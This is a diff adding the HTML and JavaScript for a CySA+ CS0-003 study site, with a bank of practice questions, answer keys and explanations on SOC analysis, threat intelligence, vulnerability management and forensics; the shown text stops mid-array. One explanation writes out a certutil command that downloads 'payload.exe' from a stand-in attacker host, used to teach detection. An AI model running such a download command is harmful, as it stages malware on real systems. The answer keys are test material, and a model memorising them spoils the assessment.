@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CySA+ CS0-003 Study Hub — Free Cybersecurity Analyst Practice</title>
+<meta name="description" content="Free CompTIA CySA+ CS0-003 study hub with 1000+ practice questions, PBQ simulations, exam simulator, and domain-weighted scoring. Pass CySA+ on your first attempt.">
+<meta property="og:title" content="CySA+ CS0-003 Study Hub">
+<meta property="og:description" content="Free CySA+ CS0-003 study tool — 1000+ questions, PBQ labs, exam simulator, domain guides.">
+<meta property="og:type" content="website">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔍</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#f8fafb;--bg2:#fff;--bg3:#f1f3f7;--bg4:#e8ecf2;
+  --bd:#e2e8f0;--bd2:#cbd5e1;
+  --tx:#0f172a;--tx2:#334155;--tx3:#64748b;--tx4:#94a3b8;
+  --cy:#0891b2;--cy0:rgba(8,145,178,.1);
+  --gn:#059669;--gn0:rgba(5,150,105,.1);
+  --pk:#db2777;--pk0:rgba(219,39,119,.1);
+  --ye:#d97706;--ye0:rgba(217,119,6,.1);
+  --pu:#7c3aed;--pu0:rgba(124,58,237,.1);
+  --or:#ea580c;--or0:rgba(234,88,12,.1);
+  --rd:#dc2626;--rd0:rgba(220,38,38,.1);
+  --shadow:0 1px 3px rgba(0,0,0,.08);
+  --radius:14px;--radius-sm:10px;
+  --btn-s-bg:#f1f5f9;
+}
+[data-theme="dark"]{
+  --bg:#0f1117;--bg2:#161b25;--bg3:#1c2333;--bg4:#222c3c;
+  --bd:#1e2a3a;--bd2:#2a3a50;
+  --tx:#e8edf5;--tx2:#a0aec0;--tx3:#6b7db3;--tx4:#3d4f6b;
+  --cy:#38bdf8;--cy0:rgba(56,189,248,.1);
+  --gn:#34d399;--gn0:rgba(52,211,153,.1);
+  --pk:#f472b6;--pk0:rgba(244,114,182,.1);
+  --ye:#fbbf24;--ye0:rgba(251,191,36,.1);
+  --pu:#a78bfa;--pu0:rgba(167,139,250,.1);
+  --or:#fb923c;--or0:rgba(251,146,60,.1);
+  --rd:#ef4444;--rd0:rgba(239,68,68,.1);
+  --btn-s-bg:#1c2333;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;transition:background .3s,color .3s}
+.app{display:flex;min-height:100vh}
+.rail{width:220px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;padding:16px;position:fixed;height:100vh;z-index:100}
+.rail-logo{font-family:Syne,sans-serif;font-size:17px;font-weight:800;color:var(--cy);margin-bottom:2px;padding:8px}
+.rail-sub{font-size:11px;color:var(--tx3);padding:0 8px 16px;border-bottom:1px solid var(--bd)}
+.rail-nav{display:flex;flex-direction:column;gap:4px;margin-top:12px;flex:1}
+.nav-btn{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:10px;border:none;background:none;cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;color:var(--tx3);width:100%;text-align:left;transition:all .15s}
+.nav-btn:hover{background:var(--bg3);color:var(--tx)}
+.nav-btn.active{background:var(--cy0);color:var(--cy);font-weight:700}
+.nav-icon{font-size:16px;width:20px;text-align:center}
+.rail-footer{border-top:1px solid var(--bd);padding-top:12px;margin-top:auto}
+.main{margin-left:220px;flex:1}
+.pg{padding:24px;max-width:1000px;margin:0 auto}
+.card{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
+.card2{background:linear-gradient(135deg,var(--cy0),rgba(124,58,237,.08));border:1px solid rgba(8,145,178,.2);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
+.btn{padding:10px 18px;border-radius:var(--radius-sm);border:none;cursor:pointer;font-family:Syne,sans-serif;font-size:13px;font-weight:700;transition:all .15s;display:inline-flex;align-items:center;gap:6px}
+.btn-p{background:linear-gradient(135deg,var(--cy),var(--pu));color:#fff}
+.btn-p:hover{opacity:.9;transform:translateY(-1px)}
+.btn-s{background:var(--btn-s-bg);border:1px solid var(--bd2);color:var(--tx)}
+.btn-s:hover{border-color:var(--cy);color:var(--cy)}
+.btn-full{width:100%;justify-content:center}
+.stitle{font-size:13px;font-weight:700;color:var(--tx3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;border:none;padding:0;background:none;display:block}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
+.stat-card{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);padding:16px;text-align:center}
+.stat-num{font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:var(--cy)}
+.stat-label{font-size:11px;color:var(--tx3);margin-top:2px}
+.ans{display:flex;align-items:flex-start;gap:12px;padding:12px 14px;border-radius:var(--radius-sm);border:1.5px solid var(--bd2);background:var(--bg2);cursor:pointer;margin-bottom:8px;transition:all .15s;font-size:14px;line-height:1.5;color:var(--tx2);text-align:left;width:100%;font-family:inherit}
+.ans:hover{border-color:var(--cy);background:var(--cy0)}
+.ans.sel{border-color:var(--cy);background:var(--cy0);color:var(--cy)}
+.ans.hit{border-color:var(--gn);background:var(--gn0);color:var(--gn)}
+.ans.miss{border-color:var(--rd);background:var(--rd0);color:var(--rd)}
+.ans.dim{opacity:.5}
+.ltr{width:26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;flex-shrink:0;background:var(--bg3);color:var(--tx3)}
+.ans.sel .ltr{background:var(--cy0);color:var(--cy)}
+.ans.hit .ltr{background:var(--gn0);color:var(--gn)}
+.ans.miss .ltr{background:var(--rd0);color:var(--rd)}
+.prog-bar{height:6px;background:var(--bg4);border-radius:3px;overflow:hidden;margin-bottom:6px}
+.prog-fill{height:100%;border-radius:3px;transition:width .3s;background:linear-gradient(90deg,var(--cy),var(--pu))}
+.fc{perspective:1200px;-webkit-perspective:1200px;cursor:pointer;margin-bottom:16px}
+.fc-inner{transition:transform .35s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d;-webkit-transform-style:preserve-3d;position:relative;min-height:200px;width:100%;will-change:transform}
+.fc.flipped .fc-inner{transform:rotateY(180deg)}
+.fc-front,.fc-back{position:absolute;width:100%;height:100%;min-height:200px;backface-visibility:hidden;-webkit-backface-visibility:hidden;border-radius:var(--radius);border:1px solid var(--bd);padding:24px;display:flex;align-items:center;justify-content:center}
+.fc-front{background:var(--bg2)}
+.fc-back{background:var(--gn0);border-color:var(--gn);transform:rotateY(180deg)}
+#toast-wrap{position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast-msg{background:var(--tx);color:var(--bg);padding:10px 16px;border-radius:10px;font-size:13px;font-weight:600;animation:slideIn .3s ease;pointer-events:none}
+@keyframes slideIn{from{transform:translateX(100px);opacity:0}to{transform:translateX(0);opacity:1}}
+.bnav{display:none;position:fixed;bottom:0;left:0;right:0;background:var(--bg2);border-top:1px solid var(--bd);padding:8px;z-index:100;grid-template-columns:repeat(5,1fr)}
+.bnav-btn{display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px;border:none;background:none;cursor:pointer;font-size:10px;font-weight:600;color:var(--tx3);font-family:inherit}
+.bnav-btn.active{color:var(--cy)}
+.row{display:flex;align-items:center;gap:8px}
+.exam-bar{position:sticky;top:0;z-index:50;background:var(--bg2);border-bottom:1px solid var(--bd);padding:10px 20px}
+@media(max-width:768px){.rail{display:none}.main{margin-left:0;padding-bottom:70px}.bnav{display:grid}.stats-grid{grid-template-columns:repeat(2,1fr)}.pg{padding:14px}}
+@media(max-width:480px){.btn{padding:8px 12px;font-size:12px}}
+</style>
+</head>
+<body data-theme="light">
+<div id="toast-wrap"></div>
+<div class="app">
+  <nav class="rail">
+    <div class="rail-logo">CySA+ Hub</div>
+    <div class="rail-sub">CS0-003 Study Platform</div>
+    <div class="rail-nav">
+      <button class="nav-btn active" aria-label="Home" onclick="setTab('home')"><span class="nav-icon">🏠</span>Home</button>
+      <button class="nav-btn" aria-label="Practice Quiz" onclick="setTab('quiz')"><span class="nav-icon">❓</span>Practice Quiz</button>
+      <button class="nav-btn" aria-label="Exam Simulator" onclick="setTab('exam')"><span class="nav-icon">📝</span>Exam Simulator</button>
+      <button class="nav-btn" aria-label="Flashcards" onclick="setTab('cards')"><span class="nav-icon">🃏</span>Flashcards</button>
+      <button class="nav-btn" aria-label="Domain Guide" onclick="setTab('learn')"><span class="nav-icon">📖</span>Domains</button>
+    </div>
+    <div class="rail-footer">
+      <button class="nav-btn" onclick="toggleTheme()"><span class="nav-icon">🌙</span><span id="theme-lbl">Dark Mode</span></button>
+      <div style="font-size:10px;color:var(--tx4);padding:8px;margin-top:4px">cysa.kulaninstitute.org</div>
+    </div>
+  </nav>
+  <main class="main" id="main" role="main" aria-label="CySA+ Study Hub content"></main>
+</div>
+<nav class="bnav" id="bnav">
+  <button class="bnav-btn active" aria-label="Home" onclick="setTab('home')">🏠<span>Home</span></button>
+  <button class="bnav-btn" aria-label="Quiz" onclick="setTab('quiz')">❓<span>Quiz</span></button>
+  <button class="bnav-btn" aria-label="Exam" onclick="setTab('exam')">📝<span>Exam</span></button>
+  <button class="bnav-btn" aria-label="Cards" onclick="setTab('cards')">🃏<span>Cards</span></button>
+  <button class="bnav-btn" aria-label="Domains" onclick="setTab('learn')">📖<span>Domains</span></button>
+</nav>
+<script>
+const QZ=[
+{q:"A SIEM alert fires for 500 failed logins across 200 different accounts from one external IP in 10 minutes. The analyst's FIRST action is:",o:["Block the source IP immediately", "Classify as a password spray attack — notify account owners and escalate", "Ignore — probably a scanner", "Reset all 200 accounts"],a:1,d:1,e:"Password spray attacks try a few common passwords against many accounts to avoid lockout. The pattern (many accounts, few attempts each, one source IP) is the signature. First action: classify and escalate. Blocking the IP is reasonable but secondary — the analyst must first confirm and communicate."},
+{q:"Which log source would BEST help an analyst determine whether a phishing email was actually opened and a link clicked?",o:["Firewall logs", "Email gateway logs combined with DNS/proxy logs showing the destination URL was resolved", "Authentication logs", "DHCP logs"],a:1,d:1,e:"Email gateway logs show delivery and open events. DNS/proxy logs show whether the phishing URL was resolved or visited after the email arrived. Correlation of both confirms the full chain: email delivered → link clicked → destination contacted. This is the analyst's primary evidence chain for phishing triage."},
+{q:"An analyst reviewing Windows event logs sees Event ID 4688 with process name 'powershell.exe' and parent process 'winword.exe'. This MOST likely indicates:",o:["Normal macro execution", "A macro-based malware attack — Word spawning PowerShell is a classic malicious macro indicator", "Scheduled task execution", "Normal IT administration"],a:1,d:1,e:"Word (winword.exe) should never spawn PowerShell as a child process in legitimate business use. This parent-child relationship is a high-fidelity indicator of macro-based malware — the Word document contained a malicious macro that launched PowerShell. Event ID 4688 (Process Creation) with parent tracking is critical for detecting this."},
+{q:"Which SIEM use case detects an attacker using legitimate admin tools to move laterally after initial compromise?",o:["Signature-based malware detection", "Living-off-the-land (LOTL) detection — flagging use of built-in tools (PsExec, WMI, PowerShell) in unusual contexts", "DDoS detection", "Phishing email detection"],a:1,d:1,e:"Living-off-the-land attacks use legitimate built-in tools (PsExec, WMI, WMIC, PowerShell, certutil) to avoid malware detection. SIEM rules detecting unusual use of these tools — non-admin users running PsExec, PowerShell with encoded commands, WMI remote execution — catch this technique. Signature-based AV misses these entirely."},
+{q:"A SOC analyst receives an alert: 'Outbound HTTPS connection to a newly registered domain (3 days old) from a server that normally only accepts inbound connections.' The analyst should:",o:["Close as false positive — HTTPS is encrypted and safe", "Investigate as high-priority — servers initiating outbound connections to new domains is anomalous and suggests C2 communication", "Notify the server owner", "Block the domain at the firewall without investigation"],a:1,d:1,e:"Servers (not workstations) initiating outbound connections is already anomalous. Connecting to a brand-new domain compounds suspicion — attackers register new domains specifically to avoid blocklists. This pattern (server → new domain, HTTPS for C2 encryption) is a high-confidence C2 indicator requiring immediate investigation."},
+{q:"Which tool provides the BEST visibility into east-west (lateral) traffic between internal network segments?",o:["Perimeter firewall logs", "Internal network taps/spans or network detection and response (NDR) on internal segments", "External IDS only", "DHCP server logs"],a:1,d:1,e:"Perimeter firewalls see north-south (in/out) traffic but miss internal lateral movement. NDR deployed on internal segments captures server-to-server traffic. After initial compromise, attackers move laterally — without internal visibility, this movement is completely invisible. Internal network monitoring is essential for detecting post-compromise lateral movement."},
+{q:"An analyst sees repeated DNS TXT record queries of 40-60 characters to subdomains of a single external domain from one internal host. This MOST likely indicates:",o:["Normal application behavior", "DNS tunneling — encoding data in DNS queries for C2 or exfiltration", "CDN health checks", "DNSSEC validation"],a:1,d:1,e:"DNS tunneling encodes data in query/response strings. Long random-looking subdomains, high query frequency to one parent domain, TXT record queries (which carry arbitrary data), and the pattern matching 'base64-encoded chunks' all indicate DNS tunneling. The host likely has malware using DNS as a covert channel to bypass firewall rules."},
+{q:"Which artifact from an endpoint is MOST valuable for determining what happened immediately before a system was rebooted?",o:["System event logs", "Volatile memory (RAM) dump captured before reboot — contains running processes, network connections, encryption keys", "Hard disk image", "Registry hive"],a:1,d:1,e:"RAM contains volatile evidence lost on reboot: running processes (including malware with no disk footprint), active network connections (C2 channels), decrypted data (ransomware keys, credentials), and injected code. For incident response, capturing RAM before reboot preserves the most time-sensitive evidence. Hard disk imaging comes after."},
+{q:"A threat hunter develops a hypothesis: 'An attacker may be using certutil.exe to download malware.' Which data source BEST tests this hypothesis?",o:["Antivirus logs", "Process creation logs (Event ID 4688 or EDR telemetry) showing certutil.exe with URL arguments", "Network firewall logs", "Email gateway logs"],a:1,d:1,e:"certutil.exe is a legitimate Windows certificate utility that attackers abuse for downloading files: 'certutil -urlcache -split -f http://attacker.com/payload.exe'. Process creation logs with command-line arguments (enabled via audit policy or EDR) show exactly what arguments certutil ran. This is the primary data source for this specific hunting hypothesis."},
+{q:"Which technique does an attacker use to establish persistence that survives a system reboot without dropping executable files to disk?",o:["Registry run keys", "WMI event subscriptions — triggers execute code when WMI events fire, surviving reboots, often missed by AV", "Scheduled tasks", "Service installation"],a:1,d:1,e:"WMI event subscriptions (WMI-based persistence) create an event filter paired with an event consumer. When the trigger fires (e.g., system startup), the consumer executes code — often a PowerShell command downloaded from the internet rather than stored on disk. This fileless persistence evades many endpoint controls and is difficult to detect without WMI audit logging."},
+{q:"Which threat intelligence framework categorizes indicators by their 'pain level' for attackers if defenders detect and block them?",o:["MITRE ATT&CK", "Pyramid of Pain — from easy-to-change hash values at bottom to hard-to-change TTPs at top", "Diamond Model", "Kill chain"],a:1,d:1,e:"Pyramid of Pain (David Bianco): Hash values (trivial to change) → IP addresses → Domain names → Network artifacts → Host artifacts → Tools → TTPs (very hard to change). Detecting TTPs causes the most pain because the attacker must fundamentally change how they operate. Blocking hashes only forces a recompile. Focus defensive energy on TTP-level detection."},
+{q:"An analyst receives a threat intelligence report containing STIX indicators. To automatically consume and act on these indicators in security tools, which protocol should be used?",o:["HTTP REST API", "TAXII — the transport protocol for sharing STIX threat intelligence between systems", "SNMP", "Syslog"],a:1,d:1,e:"STIX (Structured Threat Information eXpression) is the format for describing threat intelligence. TAXII (Trusted Automated eXchange of Intelligence Information) is the transport protocol for sharing STIX data between organizations and tools. Together they enable automated threat intelligence sharing. MISP and other TIPs implement TAXII servers for distributing indicators."},
+{q:"Which type of threat intelligence is MOST actionable for an analyst blocking indicators at the firewall today?",o:["Strategic intelligence (geopolitical threat landscape)", "Tactical intelligence — specific IoCs like malicious IPs, domains, and file hashes that can be immediately blocked", "Operational intelligence (attacker campaigns)", "Technical intelligence (malware code analysis)"],a:1,d:1,e:"Tactical intelligence provides immediately usable indicators: IP addresses to block, domains to sinkhole, file hashes for EDR rules. Strategic intelligence informs executive decisions. Operational intelligence helps understand campaigns. Technical intelligence supports malware analysis. For same-day defensive action, tactical IoCs are what analysts implement directly in security tools."},
+{q:"The Diamond Model of intrusion analysis organizes incidents around four features. Which feature describes the tools and techniques used?",o:["Adversary", "Infrastructure", "Capability — the tools, malware, and techniques used by the attacker", "Victim"],a:2,d:1,e:"Diamond Model: Adversary (threat actor) ↔ Capability (tools/techniques) ↔ Infrastructure (IP addresses, domains, servers) ↔ Victim (target). Analysts use the model to pivot between features — a known capability links to known infrastructure which links to the adversary. This structured approach enables better attribution and intelligence sharing."},
+{q:"An analyst identifies that an attacker used a zero-day exploit. On the Pyramid of Pain, this is best classified as which indicator type?",o:["Hash value — easy to change", "TTPs (tactics, techniques, and procedures) — hardest to change and most valuable to detect", "Domain name — moderate difficulty", "IP address — easy to change"],a:1,d:1,e:"A zero-day exploit represents a specific technique used by the attacker. Techniques are near the top of the Pyramid of Pain — detecting the technique (exploiting a specific vulnerability in a specific way) provides the most durable detection. Even if the attacker fixes or changes their tool, the underlying TTP (exploiting that vulnerability class) may remain consistent."},
+{q:"Which SIEM capability reduces analyst workload by automatically grouping multiple related alerts into a single investigation case?",o:["Log normalization", "Alert correlation and case management — grouping related alerts reduces alert fatigue", "Log retention", "User behavior analytics"],a:1,d:1,e:"Alert grouping/correlation reduces alert fatigue by combining related events. Instead of 50 alerts about the same attack, the SIEM creates one case with all related evidence. SOAR platforms extend this with automated enrichment and response. The goal is giving analysts fewer, higher-quality investigations rather than drowning them in individual alerts."},
+{q:"An EDR agent records a process injecting code into a legitimate Windows process (lsass.exe). This technique is called:",o:["Pass-the-hash", "Process injection — injecting malicious code into a legitimate process to hide and inherit its privileges", "DLL hijacking", "Privilege escalation"],a:1,d:1,e:"Process injection injects malicious code into legitimate processes. Injecting into lsass.exe is particularly dangerous — lsass runs as SYSTEM, and Mimikatz injects into lsass to dump credentials. EDR telemetry capturing process injection events (via API hooking or kernel sensors) is essential for detecting this stealthy technique that security software typically runs inside."},
+{q:"Which Windows artifact records the last time an application was run on a system, useful for proving execution of malware even if the file was deleted?",o:["Windows Registry Run keys", "Prefetch files (.pf in C:\\Windows\\Prefetch) — record execution time and file references", "Event logs", "Browser history"],a:1,d:1,e:"Windows Prefetch caches information about recently run applications: executable name, run count, last run time (up to 8 run times in Win10+), and files referenced during execution. Forensically, Prefetch proves a program ran even after deletion. Attackers sometimes disable Prefetch or delete .pf files — its absence can itself be suspicious on a system where it was previously enabled."},
+{q:"A user reports their account was used to send mass phishing emails overnight while they were asleep. Which log source FIRST confirms whether the account was legitimately or maliciously accessed?",o:["Email content logs", "Authentication logs showing the source IP, geography, and method used for the login that sent the emails", "Firewall logs", "DNS logs"],a:1,d:1,e:"Authentication logs show: who logged in, from where (IP → geolocation), when, and how (password? MFA? which MFA method?). If the overnight login came from a foreign IP or different device than the user's normal profile, it confirms account compromise. Email logs show what was sent; auth logs prove who (or what) sent it."},
+{q:"Which network security monitoring technique captures full packet data including payload for deep forensic analysis?",o:["NetFlow/IPFIX — metadata only", "Full packet capture (PCAP) — records complete packet contents including payload", "IDS signatures", "Firewall logs"],a:1,d:1,e:"PCAP captures complete packet data — headers and payload — enabling full session reconstruction, payload analysis, and evidence of data exfiltrated. NetFlow captures metadata only (who talked to whom, when, how much). PCAP is storage-intensive but provides the richest forensic evidence. Security teams typically capture PCAP on segments of interest rather than everywhere."},
+{q:"An analyst receives vulnerability scan results showing a CVSS 9.8 critical vulnerability on an internal server with no internet exposure, and a CVSS 7.0 high on an internet-facing payment server. Which should be patched FIRST?",o:["The CVSS 9.8 — higher score always means higher priority", "The CVSS 7.0 on the internet-facing payment server — asset exposure and context make it higher actual risk", "Both simultaneously", "Neither — escalate to management"],a:1,d:2,e:"CVSS measures technical severity, not actual risk. The internet-facing payment server is directly reachable by attackers worldwide and handles sensitive financial data. The internal server with no internet exposure has limited attack paths. Risk = Severity × Likelihood × Impact. Context (exposure, asset value, exploitability) must modify raw CVSS scores for meaningful prioritization."},
+{q:"Which vulnerability management metric measures the time from public CVE disclosure to patch deployment in an organization?",o:["Mean Time to Detect (MTTD)", "Mean Time to Remediate (MTTR) — time from vulnerability discovery/disclosure to patching", "Vulnerability age", "Patch coverage percentage"],a:1,d:2,e:"MTTR in vulnerability management tracks how quickly vulnerabilities are remediated. The longer MTTR, the larger the window attackers have to exploit known vulnerabilities. Organizations track MTTR by severity — critical vulnerabilities should have MTTR measured in days, not weeks. MTTR trending over time shows whether the patching program is improving."},
+{q:"A vulnerability scan shows a web server is running an outdated TLS version (TLS 1.0). The remediation team says it cannot be updated because a legacy application requires TLS 1.0. This is documented as a:",o:["False positive", "Risk acceptance with compensating controls — acknowledging the vulnerability while implementing alternative protections", "False negative", "Patch exception requiring re-scanning"],a:1,d:2,e:"When patching isn't possible, the risk must be formally documented. A risk acceptance records the vulnerability, business justification, compensating controls (e.g., restrict access to TLS 1.0 service to specific known IPs, monitor traffic closely), risk owner's signature, and review date. This creates accountability and ensures the risk isn't forgotten."},
+{q:"Which tool is MOST appropriate for identifying misconfigurations in cloud infrastructure resources like exposed S3 buckets and overly permissive IAM roles?",o:["Network vulnerability scanner", "CSPM (Cloud Security Posture Management) tool", "Web application scanner", "Password auditing tool"],a:1,d:2,e:"CSPM tools continuously scan cloud environments for security misconfigurations. They check: public storage bucket access, overpermissive IAM policies, unencrypted data stores, security group rules allowing 0.0.0.0/0, missing logging, and compliance against CIS benchmarks. Traditional network scanners don't understand cloud-specific configurations."},
+{q:"An analyst is prioritizing vulnerabilities using CVSS scores. Which CVSS metric specifically indicates whether the vulnerability requires user interaction to exploit?",o:["Attack Vector", "User Interaction (UI) — indicates whether a human must take an action for exploitation to succeed", "Privileges Required", "Scope"],a:1,d:2,e:"CVSS v3 metrics include User Interaction (UI): None means no user action required (wormable, higher severity); Required means a user must click, open, or take action. Vulnerabilities not requiring user interaction are more dangerous — they can be exploited automatically without tricking anyone. This is why browser memory corruption bugs requiring 'click a link' are lower severity than server-side bugs."},
+{q:"Which vulnerability management process ensures that reported vulnerabilities are real before spending resources on remediation?",o:["Vulnerability scanning", "Vulnerability validation/confirmation — testing whether the vulnerability is actually exploitable in the specific environment", "Patch management", "Risk scoring"],a:1,d:2,e:"Vulnerability validation (confirmation) tests whether a scan finding is actually exploitable. Scanners produce false positives — a version string indicating an old, vulnerable software version even after the fix was backported. Manual validation (attempting exploitation in a safe way, reviewing actual patch state, code review) confirms real findings before consuming patching resources."},
+{q:"A web application vulnerability scan discovers SQL injection in a login form. The MOST effective long-term remediation is:",o:["Deploying a WAF to filter SQL injection attempts", "Fixing the code — using parameterized queries/prepared statements to prevent SQL injection at the source", "Disabling the login form", "Increasing logging on the database"],a:1,d:2,e:"WAFs filter known SQL injection patterns but can be bypassed with obfuscation. Parameterized queries fix the root cause — they separate code from data, so user input is never interpreted as SQL commands. WAFs are a compensating control while code is fixed, not a substitute. Code-level fixes are always preferred over filtering for application vulnerabilities."},
+{q:"Which CVSS metric indicates that exploiting the vulnerability gives the attacker control over resources BEYOND the vulnerable component?",o:["Attack Complexity", "Scope: Changed — indicates the vulnerability can impact components beyond the vulnerable component", "Privileges Required", "Confidentiality Impact"],a:1,d:2,e:"Scope: Changed (S:C) in CVSS v3 means the vulnerability can cross trust boundaries and affect other components. Example: a sandbox escape or hypervisor escape affects the host system (beyond the VM). Scope: Changed vulnerabilities receive higher base scores because they represent more dangerous systemic impact."},
+{q:"An organization's vulnerability scan shows 2,000 findings. Which approach BEST prioritizes remediation for maximum risk reduction?",o:["Patch by CVSS score, highest first", "Risk-based prioritization: CVSS + CISA KEV status + asset criticality + exploitability evidence — focus on internet-exposed critical assets with active exploits", "Patch oldest vulnerabilities first", "Patch by vendor release date"],a:1,d:2,e:"Risk-based prioritization considers: Is this on CISA's Known Exploited Vulnerabilities list? Is there active exploitation in the wild? Is the asset internet-facing and critical? CVSS alone treats an air-gapped lab server with CVSS 9.8 the same as an internet-facing payment server with CVSS 7.0. Context dramatically changes actual priority."},
+{q:"Which scanning technique performs the MOST thorough vulnerability assessment by logging into the target system?",o:["External/unauthenticated scan — simulates attacker perspective", "Credentialed/authenticated scan — uses system credentials to examine installed software versions, configurations, and patch levels", "Passive scan", "Web application scan only"],a:1,d:2,e:"Credentialed scans authenticate to target systems and examine: installed software versions, registry keys, actual patch levels, and configuration settings. They find 5-10x more vulnerabilities than unauthenticated scans which can only see what's exposed on the network. Unauthenticated scans provide the attacker perspective; credentialed scans provide comprehensive internal visibility."},
+{q:"An analyst discovers a critical vulnerability was publicly disclosed 90 days ago but has not been patched. The system owner says patching requires a maintenance window that hasn't been scheduled. BEST response:",o:["Accept the risk and wait for the next scheduled window", "Escalate to management — a 90-day unpatched critical vulnerability exceeds acceptable risk tolerance and may require emergency maintenance", "Ignore — the vendor may release another patch", "Submit a change request for the next quarterly window"],a:1,d:2,e:"90 days unpatched on a critical vulnerability is unacceptable. Most ransomware and APT attacks exploit vulnerabilities that have been patched for weeks or months. Escalation to management creates visibility and accountability. If the vulnerability is actively exploited in the wild, emergency patching procedures should override normal change windows."},
+{q:"Which process ensures that vulnerability scan results are reviewed to eliminate scanner errors and version-based false positives?",o:["Automated patching", "False positive management and scan result tuning — reviewing and suppressing findings confirmed as non-issues", "Risk acceptance", "Compensating controls"],a:1,d:2,e:"Vulnerability scanners infer vulnerabilities from version strings and installed components, producing false positives when patches are applied without version number changes (common in Linux distributions). Regular review and suppression of confirmed false positives improves signal quality. Suppressed findings should be documented with justification and reviewed periodically."},
+{q:"During incident response, an analyst discovers that a threat actor has been in the network for 60 days. Before starting eradication, the analyst must:",o:["Immediately disconnect all network connections", "Fully map the scope of compromise — all affected systems, persistence mechanisms, and lateral movement — to enable complete eradication", "Restore from backup", "Notify law enforcement immediately"],a:1,d:3,e:"Incomplete scoping leads to reinfection. After 60 days, the attacker has had time to establish persistence on many systems through multiple mechanisms. If eradication begins without complete scoping, one missed backdoor allows immediate return. Complete scope mapping — all compromised accounts, all persistence mechanisms, all affected hosts — is required for successful eradication."},
+{q:"Which phase of the incident response lifecycle involves capturing and preserving evidence while minimizing disruption?",o:["Preparation", "Detection and Analysis", "Containment — isolating affected systems while preserving forensic evidence", "Recovery"],a:2,d:3,e:"Containment stops spread while preserving evidence. The tension: fully isolating a system prevents evidence collection (memory is volatile); allowing it to run risks spread. Modern IR favors network isolation (disconnect from network while keeping running) to preserve volatile memory evidence. Forensic imaging occurs during containment, before eradication changes the evidence state."},
+{q:"A company experiences a ransomware attack. Backups are unavailable because the attackers encrypted them too. The BEST next step is:",o:["Pay the ransom — backups are gone", "Engage a specialized ransomware IR firm to investigate whether decryption is possible without paying, assess the attack scope, and evaluate legal/law enforcement obligations", "Rebuild all systems from scratch immediately", "Notify all customers immediately before assessing the damage"],a:1,d:3,e:"Before paying ransom or making major decisions, engage experts: IR firms may identify decryption keys still in memory, find backups the attackers missed, or know of free decryptors for the specific ransomware variant. Law enforcement notification may be legally required and can access intelligence unavailable to private parties. Acting without expert guidance often makes things worse."},
+{q:"Which attack framework maps adversary behavior to specific phases from initial reconnaissance through final objectives?",o:["CVSS scoring system", "MITRE ATT&CK — comprehensive knowledge base of adversary tactics and techniques observed in real attacks", "Kill chain — linear 7-phase model of attack progression", "Diamond Model"],a:2,d:3,e:"Kill chain (Lockheed Martin): Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. It's a linear model useful for understanding attack progression. MITRE ATT&CK is more comprehensive — it maps specific techniques within each tactic and is based on observed real-world attacks. Both are used in IR but ATT&CK provides more operational detail."},
+{q:"An analyst identifies malware that connects to a C2 server every 300 seconds. This regular interval is called:",o:["Exfiltration timing", "Beaconing — regular periodic callbacks to C2 infrastructure", "Port scanning", "DGA activity"],a:1,d:3,e:"Beaconing is a signature C2 behavior — malware checking in with its C2 server at regular intervals to receive commands. The regularity creates a detectable statistical pattern in network traffic. Security tools that analyze communication timing can identify beaconing even when the destination varies (e.g., via DGA). Irregular or jittered beaconing is used to evade timing-based detection."},
+{q:"During a forensic investigation, an analyst must prove that disk image evidence was not modified during analysis. The BEST method is:",o:["Storing evidence in a secure location", "Generating a cryptographic hash of the original before imaging, and hashing the image after — matching hashes prove integrity", "Using write-protected storage media", "Using licensed forensic software"],a:1,d:3,e:"Forensic integrity is proven through hash verification. SHA-256 hash of the original media before imaging, and hash of the acquired image after — matching hashes cryptographically prove the image is identical to the original and hasn't been modified. This is the foundation of forensic evidence admissibility. Any modification, however minor, changes the hash."},
+{q:"A security analyst finds a file named 'svchost.exe' running from 'C:\\Users\\Public\\' instead of 'C:\\Windows\\System32\\'. This MOST likely indicates:",o:["Normal Windows behavior", "Malware masquerading as a legitimate Windows process — legitimate svchost.exe only runs from System32", "A system update", "A software installation"],a:1,d:3,e:"Masquerading (MITRE ATT&CK T1036) involves naming malware after legitimate system processes. Legitimate svchost.exe ONLY runs from C:\\Windows\\System32 (or SysWOW64). Any svchost.exe running from user directories, temp folders, or other locations is malware. Process path verification is a fundamental analyst technique for detecting this common evasion."},
+{q:"Which artifact would an analyst examine to determine if a user intentionally copied files to a USB drive?",o:["Network traffic logs", "Windows Registry LNK files, Shellbags, and USB connection artifacts (USBSTOR registry key, SetupAPI logs)", "System event logs only", "Browser history"],a:1,d:3,e:"USB forensics uses multiple artifacts: USBSTOR registry key (records connected USB devices), SetupAPI logs (timestamps when new devices connected), Shellbags (records folders browsed — including USB drive contents), LNK files (shortcuts created when files were accessed), and jump lists. Together these build a timeline of USB usage and what files were accessed."},
